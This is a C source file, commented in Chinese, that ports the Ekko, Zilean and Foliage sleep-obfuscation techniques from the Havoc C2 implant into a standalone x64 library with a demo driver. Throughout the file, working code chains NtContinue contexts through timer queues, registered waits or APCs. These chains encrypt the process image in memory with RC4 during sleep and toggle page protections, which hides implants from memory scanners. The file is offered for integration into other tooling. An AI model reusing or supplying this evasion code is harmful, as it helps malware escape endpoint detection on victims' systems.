/*
 * 独立的 Havoc 风格睡眠混淆技术。
 *
 * 从 Havoc Demon 迁移的模式：
 *   1. EKKO    : RtlCreateTimerQueue/RtlCreateTimer + NtContinue
 *   2. ZILEAN  : RtlRegisterWait + NtContinue
 *   3. FOLIAGE : QueueUserAPC + NtContinue
 *
 * 与 Havoc 的区别（便于独立迁移）：
 *   - 仅支持 x64。
 *   - 不使用直接系统调用。
 *   - 不依赖 Havoc 实例/全局状态。
 *   - 不进行栈欺骗和 CFG jmp-gadget 绕过。
 *   - APC 模式使用一个小型堆 thunk，使 WinAPI QueueUserAPC 能够调用
 *     NtContinue(ctx, FALSE)；Havoc 使用带 3 个参数的 NtQueueApcThread。
 *
 * 集成接口：
 *   HavocSleepMaskTechnique(technique, mask_base, mask_size,
 *                           restore_base, restore_size, restore_protect,
 *                           sleep_ms)
 *
 * 编译：
 *   gcc -m64 -O2 -Wall -Wextra -Wno-cast-function-type -DWIN32_LEAN_AND_MEAN -o havoc_sleep_obf_demo.x64.exe havoc_sleep_obf.c
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _WIN64
int main(void)
{
    puts("havoc_sleep_obf.c is x64-only.");
    return 1;
}
#else

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((LONG)(Status)) >= 0)
#endif

#ifndef WT_EXECUTEINTIMERTHREAD
#define WT_EXECUTEINTIMERTHREAD 0x00000020
#endif

#ifndef WT_EXECUTEINWAITTHREAD
#define WT_EXECUTEINWAITTHREAD 0x00000004
#endif

#ifndef WT_EXECUTEONLYONCE
#define WT_EXECUTEONLYONCE 0x00000008
#endif

#define SLEEPOBF_EKKO    1u
#define SLEEPOBF_ZILEAN  2u
#define SLEEPOBF_FOLIAGE 3u

typedef struct _USTRING_LOCAL {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING_LOCAL, *PUSTRING_LOCAL;

typedef LONG (NTAPI *PFN_RTL_CREATE_TIMER_QUEUE)(PHANDLE TimerQueueHandle);
typedef LONG (NTAPI *PFN_RTL_CREATE_TIMER)(
    HANDLE TimerQueueHandle,
    PHANDLE TimerHandle,
    WAITORTIMERCALLBACKFUNC Function,
    PVOID Context,
    DWORD DueTime,
    DWORD Period,
    ULONG Flags);
typedef LONG (NTAPI *PFN_RTL_DELETE_TIMER_QUEUE)(HANDLE TimerQueueHandle);
typedef LONG (NTAPI *PFN_RTL_REGISTER_WAIT)(
    PHANDLE WaitHandle,
    HANDLE Handle,
    WAITORTIMERCALLBACKFUNC Function,
    PVOID Context,
    ULONG Milliseconds,
    ULONG Flags);
typedef LONG (NTAPI *PFN_RTL_DEREGISTER_WAIT)(HANDLE WaitHandle);
typedef VOID (WINAPI *PFN_RTL_CAPTURE_CONTEXT)(PCONTEXT ContextRecord);
typedef LONG (NTAPI *PFN_NT_CONTINUE)(PCONTEXT ContextRecord, BOOLEAN TestAlert);
typedef LONG (WINAPI *PFN_SYSTEM_FUNCTION_032)(PUSTRING_LOCAL Data, PUSTRING_LOCAL Key);

typedef struct _SLEEP_APIS {
    PFN_RTL_CREATE_TIMER_QUEUE RtlCreateTimerQueue;
    PFN_RTL_CREATE_TIMER       RtlCreateTimer;
    PFN_RTL_DELETE_TIMER_QUEUE RtlDeleteTimerQueue;
    PFN_RTL_REGISTER_WAIT      RtlRegisterWait;
    PFN_RTL_DEREGISTER_WAIT    RtlDeregisterWait;
    PFN_RTL_CAPTURE_CONTEXT    RtlCaptureContext;
    PFN_NT_CONTINUE            NtContinue;
    PFN_SYSTEM_FUNCTION_032    SystemFunction032;
} SLEEP_APIS;

static FARPROC ResolveProc(HMODULE module, const char* name)
{
    return module ? GetProcAddress(module, name) : NULL;
}

static BOOL ResolveSleepApis(SLEEP_APIS* api)
{
    HMODULE ntdll;
    HMODULE advapi;

    ZeroMemory(api, sizeof(*api));

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) ntdll = LoadLibraryW(L"ntdll.dll");

    advapi = GetModuleHandleW(L"advapi32.dll");
    if (!advapi) advapi = LoadLibraryW(L"advapi32.dll");

    api->RtlCreateTimerQueue = (PFN_RTL_CREATE_TIMER_QUEUE)ResolveProc(ntdll, "RtlCreateTimerQueue");
    api->RtlCreateTimer      = (PFN_RTL_CREATE_TIMER)ResolveProc(ntdll, "RtlCreateTimer");
    api->RtlDeleteTimerQueue = (PFN_RTL_DELETE_TIMER_QUEUE)ResolveProc(ntdll, "RtlDeleteTimerQueue");
    api->RtlRegisterWait     = (PFN_RTL_REGISTER_WAIT)ResolveProc(ntdll, "RtlRegisterWait");
    api->RtlDeregisterWait   = (PFN_RTL_DEREGISTER_WAIT)ResolveProc(ntdll, "RtlDeregisterWait");
    api->RtlCaptureContext   = (PFN_RTL_CAPTURE_CONTEXT)ResolveProc(ntdll, "RtlCaptureContext");
    api->NtContinue          = (PFN_NT_CONTINUE)ResolveProc(ntdll, "NtContinue");
    api->SystemFunction032   = (PFN_SYSTEM_FUNCTION_032)ResolveProc(advapi, "SystemFunction032");

    return api->RtlCreateTimerQueue &&
           api->RtlCreateTimer &&
           api->RtlDeleteTimerQueue &&
           api->RtlRegisterWait &&
           api->RtlCaptureContext &&
           api->NtContinue &&
           api->SystemFunction032;
}

static VOID FillRandomKey(BYTE key[16])
{
    LARGE_INTEGER counter;
    DWORD seed;
    INT i;

    QueryPerformanceCounter(&counter);
    seed = GetTickCount() ^ GetCurrentProcessId() ^ (DWORD)counter.LowPart ^ (DWORD)counter.HighPart;

    for (i = 0; i < 16; ++i) {
        seed = seed * 1664525u + 1013904223u;
        key[i] = (BYTE)(seed >> 24);
    }
}

static PVOID BuildApcNtContinueThunk(PVOID nt_continue)
{
    BYTE code[] = {
        0x31, 0xD2,                         /* xor edx, edx -- 将 edx 清零 */
        0x48, 0xB8,                         /* mov rax, imm64 -- 将 imm64 加载到 rax */
        0, 0, 0, 0, 0, 0, 0, 0,
        0xFF, 0xE0                          /* jmp rax -- 跳转到 rax */
    };
    DWORD old_protect = 0;
    PVOID thunk;

    memcpy(code + 4, &nt_continue, sizeof(nt_continue));
    thunk = VirtualAlloc(NULL, sizeof(code), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!thunk) return NULL;

    memcpy(thunk, code, sizeof(code));
    VirtualProtect(thunk, sizeof(code), PAGE_EXECUTE_READ, &old_protect);
    FlushInstructionCache(GetCurrentProcess(), thunk, sizeof(code));
    return thunk;
}

static VOID BuildApiContext(CONTEXT* ctx, const CONTEXT* seed, PVOID fn,
                            ULONG_PTR a0, ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3)
{
    *ctx = *seed;
    ctx->ContextFlags = CONTEXT_FULL;
    ctx->Rip = (DWORD64)(ULONG_PTR)fn;
    ctx->Rcx = (DWORD64)a0;
    ctx->Rdx = (DWORD64)a1;
    ctx->R8  = (DWORD64)a2;
    ctx->R9  = (DWORD64)a3;
    ctx->Rsp -= sizeof(PVOID);
}

static BOOL ScheduleEkko(const SLEEP_APIS* api, HANDLE queue, WAITORTIMERCALLBACKFUNC cb, PVOID arg, DWORD delay_ms)
{
    HANDLE timer = NULL;
    LONG status = api->RtlCreateTimer(queue, &timer, cb, arg, delay_ms, 0, WT_EXECUTEINTIMERTHREAD);
    return NT_SUCCESS(status);
}

static BOOL ScheduleZilean(const SLEEP_APIS* api, HANDLE wait_event, HANDLE* wait_handle,
                           WAITORTIMERCALLBACKFUNC cb, PVOID arg, DWORD delay_ms)
{
    LONG status = api->RtlRegisterWait(wait_handle, wait_event, cb, arg, delay_ms,
                                       WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD);
    return NT_SUCCESS(status);
}

static BOOL TimerSleepMask(DWORD technique, PVOID mask_base, SIZE_T mask_size,
                           PVOID restore_base, SIZE_T restore_size, DWORD restore_protect,
                           DWORD sleep_ms)
{
    enum { ROP_WAIT_START, ROP_SET_RW, ROP_ENCRYPT, ROP_SLEEP, ROP_DECRYPT, ROP_RESTORE, ROP_DONE, ROP_COUNT };

    SLEEP_APIS api;
    HANDLE queue = NULL;
    HANDLE wait_event = NULL;
    HANDLE wait_handles[ROP_COUNT + 2];
    HANDLE ev_captured = NULL;
    HANDLE ev_start = NULL;
    HANDLE ev_done = NULL;
    CONTEXT seed;
    CONTEXT rop[ROP_COUNT];
    BYTE key_bytes[16];
    USTRING_LOCAL key;
    USTRING_LOCAL image;
    DWORD old_mask_protect = 0;
    DWORD old_restore_protect = 0;
    DWORD delay = 100;
    DWORD wait_ms;
    INT i;
    BOOL ok = FALSE;

    if (!ResolveSleepApis(&api)) return FALSE;

    ZeroMemory(wait_handles, sizeof(wait_handles));
    ZeroMemory(&seed, sizeof(seed));
    ZeroMemory(rop, sizeof(rop));
    FillRandomKey(key_bytes);

    key.Buffer = key_bytes;
    key.Length = key.MaximumLength = sizeof(key_bytes);
    image.Buffer = mask_base;
    image.Length = image.MaximumLength = (DWORD)mask_size;

    if (technique == SLEEPOBF_EKKO) {
        if (!NT_SUCCESS(api.RtlCreateTimerQueue(&queue))) goto cleanup;
    } else if (technique == SLEEPOBF_ZILEAN) {
        wait_event = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (!wait_event) goto cleanup;
    } else {
        goto cleanup;
    }

    ev_captured = CreateEventW(NULL, TRUE, FALSE, NULL);
    ev_start = CreateEventW(NULL, TRUE, FALSE, NULL);
    ev_done = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ev_captured || !ev_start || !ev_done) goto cleanup;

    seed.ContextFlags = CONTEXT_FULL;
    if (technique == SLEEPOBF_EKKO) {
        if (!ScheduleEkko(&api, queue, (WAITORTIMERCALLBACKFUNC)api.RtlCaptureContext, &seed, delay += 100)) goto cleanup;
        if (!ScheduleEkko(&api, queue, (WAITORTIMERCALLBACKFUNC)SetEvent, ev_captured, delay += 100)) goto cleanup;
    } else {
        if (!ScheduleZilean(&api, wait_event, &wait_handles[0], (WAITORTIMERCALLBACKFUNC)api.RtlCaptureContext, &seed, delay += 100)) goto cleanup;
        if (!ScheduleZilean(&api, wait_event, &wait_handles[1], (WAITORTIMERCALLBACKFUNC)SetEvent, ev_captured, delay += 100)) goto cleanup;
    }
    if (WaitForSingleObject(ev_captured, 5000) != WAIT_OBJECT_0) goto cleanup;

    BuildApiContext(&rop[ROP_WAIT_START], &seed, WaitForSingleObjectEx, (ULONG_PTR)ev_start, INFINITE, FALSE, 0);
    BuildApiContext(&rop[ROP_SET_RW], &seed, VirtualProtect, (ULONG_PTR)mask_base, mask_size, PAGE_READWRITE, (ULONG_PTR)&old_mask_protect);
    BuildApiContext(&rop[ROP_ENCRYPT], &seed, api.SystemFunction032, (ULONG_PTR)&image, (ULONG_PTR)&key, 0, 0);
    BuildApiContext(&rop[ROP_SLEEP], &seed, WaitForSingleObjectEx, (ULONG_PTR)GetCurrentProcess(), sleep_ms, FALSE, 0);
    BuildApiContext(&rop[ROP_DECRYPT], &seed, api.SystemFunction032, (ULONG_PTR)&image, (ULONG_PTR)&key, 0, 0);
    BuildApiContext(&rop[ROP_RESTORE], &seed, VirtualProtect, (ULONG_PTR)restore_base, restore_size, restore_protect, (ULONG_PTR)&old_restore_protect);
    BuildApiContext(&rop[ROP_DONE], &seed, SetEvent, (ULONG_PTR)ev_done, 0, 0, 0);

    delay = 100;
    for (i = 0; i < ROP_COUNT; ++i) {
        if (i == ROP_DECRYPT) delay += sleep_ms + 100;
        else delay += 100;

        if (technique == SLEEPOBF_EKKO) {
            if (!ScheduleEkko(&api, queue, (WAITORTIMERCALLBACKFUNC)api.NtContinue, &rop[i], delay)) goto cleanup;
        } else {
            if (!ScheduleZilean(&api, wait_event, &wait_handles[i + 2], (WAITORTIMERCALLBACKFUNC)api.NtContinue, &rop[i], delay)) goto cleanup;
        }
    }

    wait_ms = (sleep_ms > 0xFFFFD8EFu) ? INFINITE : sleep_ms + 10000;
    SetEvent(ev_start);
    ok = WaitForSingleObject(ev_done, wait_ms) == WAIT_OBJECT_0;

cleanup:
    if (queue) api.RtlDeleteTimerQueue(queue);
    if (technique == SLEEPOBF_ZILEAN && api.RtlDeregisterWait) {
        for (i = 0; i < (INT)(ROP_COUNT + 2); ++i) {
            if (wait_handles[i]) api.RtlDeregisterWait(wait_handles[i]);
        }
    }
    if (wait_event) CloseHandle(wait_event);
    if (ev_captured) CloseHandle(ev_captured);
    if (ev_start) CloseHandle(ev_start);
    if (ev_done) CloseHandle(ev_done);
    SecureZeroMemory(key_bytes, sizeof(key_bytes));
    SecureZeroMemory(&key, sizeof(key));
    SecureZeroMemory(&image, sizeof(image));
    return ok;
}

static DWORD WINAPI AlertableWorkerThread(LPVOID param)
{
    HANDLE ready = (HANDLE)param;
    if (ready) SetEvent(ready);
    for (;;) {
        SleepEx(INFINITE, TRUE);
    }
    return 0;
}

static BOOL FoliageSleepMask(PVOID mask_base, SIZE_T mask_size,
                             PVOID restore_base, SIZE_T restore_size, DWORD restore_protect,
                             DWORD sleep_ms)
{
    enum { ROP_SET_RW, ROP_ENCRYPT, ROP_SLEEP, ROP_DECRYPT, ROP_RESTORE, ROP_DONE, ROP_COUNT };

    SLEEP_APIS api;
    HANDLE ready = NULL;
    HANDLE worker = NULL;
    HANDLE ev_captured = NULL;
    HANDLE ev_done = NULL;
    CONTEXT seed;
    CONTEXT rop[ROP_COUNT];
    BYTE key_bytes[16];
    USTRING_LOCAL key;
    USTRING_LOCAL image;
    DWORD old_mask_protect = 0;
    DWORD old_restore_protect = 0;
    PVOID apc_continue_thunk = NULL;
    DWORD wait_ms;
    INT i;
    BOOL ok = FALSE;

    if (!ResolveSleepApis(&api)) return FALSE;

    ZeroMemory(&seed, sizeof(seed));
    ZeroMemory(rop, sizeof(rop));
    FillRandomKey(key_bytes);

    key.Buffer = key_bytes;
    key.Length = key.MaximumLength = sizeof(key_bytes);
    image.Buffer = mask_base;
    image.Length = image.MaximumLength = (DWORD)mask_size;

    apc_continue_thunk = BuildApcNtContinueThunk(api.NtContinue);
    ready = CreateEventW(NULL, TRUE, FALSE, NULL);
    ev_captured = CreateEventW(NULL, TRUE, FALSE, NULL);
    ev_done = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!apc_continue_thunk || !ready || !ev_captured || !ev_done) goto cleanup;

    worker = CreateThread(NULL, 0, AlertableWorkerThread, ready, 0, NULL);
    if (!worker) goto cleanup;
    if (WaitForSingleObject(ready, 5000) != WAIT_OBJECT_0) goto cleanup;

    seed.ContextFlags = CONTEXT_FULL;
    if (!QueueUserAPC((PAPCFUNC)api.RtlCaptureContext, worker, (ULONG_PTR)&seed)) goto cleanup;
    if (!QueueUserAPC((PAPCFUNC)SetEvent, worker, (ULONG_PTR)ev_captured)) goto cleanup;
    if (WaitForSingleObject(ev_captured, 5000) != WAIT_OBJECT_0) goto cleanup;

    BuildApiContext(&rop[ROP_SET_RW], &seed, VirtualProtect, (ULONG_PTR)mask_base, mask_size, PAGE_READWRITE, (ULONG_PTR)&old_mask_protect);
    BuildApiContext(&rop[ROP_ENCRYPT], &seed, api.SystemFunction032, (ULONG_PTR)&image, (ULONG_PTR)&key, 0, 0);
    BuildApiContext(&rop[ROP_SLEEP], &seed, WaitForSingleObjectEx, (ULONG_PTR)GetCurrentProcess(), sleep_ms, FALSE, 0);
    BuildApiContext(&rop[ROP_DECRYPT], &seed, api.SystemFunction032, (ULONG_PTR)&image, (ULONG_PTR)&key, 0, 0);
    BuildApiContext(&rop[ROP_RESTORE], &seed, VirtualProtect, (ULONG_PTR)restore_base, restore_size, restore_protect, (ULONG_PTR)&old_restore_protect);
    BuildApiContext(&rop[ROP_DONE], &seed, SetEvent, (ULONG_PTR)ev_done, 0, 0, 0);

    for (i = 0; i < ROP_COUNT; ++i) {
        if (!QueueUserAPC((PAPCFUNC)apc_continue_thunk, worker, (ULONG_PTR)&rop[i])) goto cleanup;
    }

    wait_ms = (sleep_ms > 0xFFFFD8EFu) ? INFINITE : sleep_ms + 10000;
    ok = WaitForSingleObject(ev_done, wait_ms) == WAIT_OBJECT_0;

cleanup:
    if (worker) {
        if (WaitForSingleObject(worker, 0) != WAIT_OBJECT_0) TerminateThread(worker, 0);
        CloseHandle(worker);
    }
    if (ready) CloseHandle(ready);
    if (ev_captured) CloseHandle(ev_captured);
    if (ev_done) CloseHandle(ev_done);
    if (apc_continue_thunk) VirtualFree(apc_continue_thunk, 0, MEM_RELEASE);
    SecureZeroMemory(key_bytes, sizeof(key_bytes));
    SecureZeroMemory(&key, sizeof(key));
    SecureZeroMemory(&image, sizeof(image));
    return ok;
}

BOOL HavocSleepMaskTechnique(DWORD technique, PVOID mask_base, SIZE_T mask_size,
                             PVOID restore_base, SIZE_T restore_size, DWORD restore_protect,
                             DWORD sleep_ms)
{
    if (!mask_base || !mask_size || !restore_base || !restore_size) return FALSE;

    switch (technique) {
    case SLEEPOBF_EKKO:
    case SLEEPOBF_ZILEAN:
        return TimerSleepMask(technique, mask_base, mask_size, restore_base, restore_size, restore_protect, sleep_ms);
    case SLEEPOBF_FOLIAGE:
        return FoliageSleepMask(mask_base, mask_size, restore_base, restore_size, restore_protect, sleep_ms);
    default:
        return FALSE;
    }
}

static BOOL GetImageLayout(HMODULE module, PVOID* image_base, SIZE_T* image_size, PVOID* text_base, SIZE_T* text_size)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    WORD i;

    if (!module) return FALSE;

    dos = (PIMAGE_DOS_HEADER)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    nt = (PIMAGE_NT_HEADERS)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    *image_base = module;
    *image_size = nt->OptionalHeader.SizeOfImage;
    *text_base = module;
    *text_size = nt->OptionalHeader.SizeOfImage;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            *text_base = (BYTE*)module + sec[i].VirtualAddress;
            *text_size = sec[i].Misc.VirtualSize;
            break;
        }
    }

    return TRUE;
}

static DWORD ParseTechnique(const char* value)
{
    if (!value || !value[0] || !strcmp(value, "ekko")) return SLEEPOBF_EKKO;
    if (!strcmp(value, "zilean")) return SLEEPOBF_ZILEAN;
    if (!strcmp(value, "foliage")) return SLEEPOBF_FOLIAGE;
    return (DWORD)strtoul(value, NULL, 0);
}

static const char* TechniqueName(DWORD technique)
{
    switch (technique) {
    case SLEEPOBF_EKKO: return "ekko";
    case SLEEPOBF_ZILEAN: return "zilean";
    case SLEEPOBF_FOLIAGE: return "foliage";
    default: return "unknown";
    }
}

static BOOL RunOne(DWORD technique, DWORD sleep_ms, BOOL self_mode)
{
    HMODULE self = GetModuleHandleW(NULL);
    PVOID image_base = NULL;
    PVOID text_base = NULL;
    SIZE_T image_size = 0;
    SIZE_T text_size = 0;
    PVOID heap = NULL;
    SIZE_T heap_size = 0x4000;
    BOOL ok;

    if (self_mode) {
        if (!GetImageLayout(self, &image_base, &image_size, &text_base, &text_size)) {
            puts("failed to parse image layout");
            return FALSE;
        }
    } else {
        heap = VirtualAlloc(NULL, heap_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (!heap) return FALSE;
        memset(heap, 0x41, heap_size);
        image_base = heap;
        image_size = heap_size;
        text_base = heap;
        text_size = heap_size;
    }

    printf("[*] technique=%s target=%s mask=%p size=0x%llx restore=%p restore_size=0x%llx sleep=%lu ms\n",
           TechniqueName(technique), self_mode ? "self" : "heap",
           image_base, (unsigned long long)image_size,
           text_base, (unsigned long long)text_size,
           sleep_ms);
    fflush(stdout);

    ok = HavocSleepMaskTechnique(technique, image_base, image_size, text_base, text_size,
                                 self_mode ? PAGE_EXECUTE_READ : PAGE_READWRITE, sleep_ms);
    printf("[*] %s: %s\n", TechniqueName(technique), ok ? "ok" : "failed");

    if (heap) VirtualFree(heap, 0, MEM_RELEASE);
    return ok;
}

static BOOL RunSelected(const char* selected, DWORD sleep_ms, BOOL self_mode)
{
    if (!strcmp(selected, "all")) {
        BOOL ok1 = RunOne(SLEEPOBF_EKKO, sleep_ms, self_mode);
        BOOL ok2 = RunOne(SLEEPOBF_ZILEAN, sleep_ms, self_mode);
        BOOL ok3 = RunOne(SLEEPOBF_FOLIAGE, sleep_ms, self_mode);
        return ok1 && ok2 && ok3;
    }

    return RunOne(ParseTechnique(selected), sleep_ms, self_mode);
}

int main(int argc, char** argv)
{
    DWORD sleep_ms = 1000;
    BOOL self_mode = FALSE;
    BOOL loop = FALSE;
    DWORD round = 0;
    INT i;

    if (argc < 2) {
        puts("usage: havoc_sleep_obf_demo.x64.exe <ekko|zilean|foliage|all> [sleep_ms] [heap|self] [once|loop]");
        puts("example: havoc_sleep_obf_demo.x64.exe all 1000 self loop");
        return 0;
    }

    if (argc > 2) sleep_ms = (DWORD)strtoul(argv[2], NULL, 10);
    for (i = 3; i < argc; ++i) {
        if (!strcmp(argv[i], "self")) {
            self_mode = TRUE;
        } else if (!strcmp(argv[i], "heap")) {
            self_mode = FALSE;
        } else if (!strcmp(argv[i], "loop")) {
            loop = TRUE;
        } else if (!strcmp(argv[i], "once")) {
            loop = FALSE;
        }
    }

    if (!loop) {
        return RunSelected(argv[1], sleep_ms, self_mode) ? 0 : 1;
    }

    puts("[*] loop mode enabled, press Ctrl+C to stop.");
    for (;;) {
        printf("[*] round %lu\n", ++round);
        fflush(stdout);
        RunSelected(argv[1], sleep_ms, self_mode);
    }
}

#endif
